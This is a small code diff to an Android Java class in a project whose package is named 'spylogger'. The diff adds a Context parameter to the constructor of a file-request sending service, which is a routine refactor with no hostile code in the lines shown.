@@ -1,5 +1,7 @@
 package com.gravatasufoca.spylogger.services;
 
+import android.content.Context;
+
 import com.gravatasufoca.spylogger.helpers.TaskComplete;
 import com.gravatasufoca.spylogger.vos.EnvioArquivoVO;
 
@@ -13,8 +15,8 @@ import retrofit2.Call;
 
 public class SendSolicitacoesArquivos extends SendDataService<List<Integer>> {
 
-    public SendSolicitacoesArquivos(TaskComplete handler) {
-        super(handler);
+    public SendSolicitacoesArquivos(Context context,TaskComplete handler) {
+        super(context,handler);
     }
 
     public void enviar(EnvioArquivoVO envioArquivoVO){
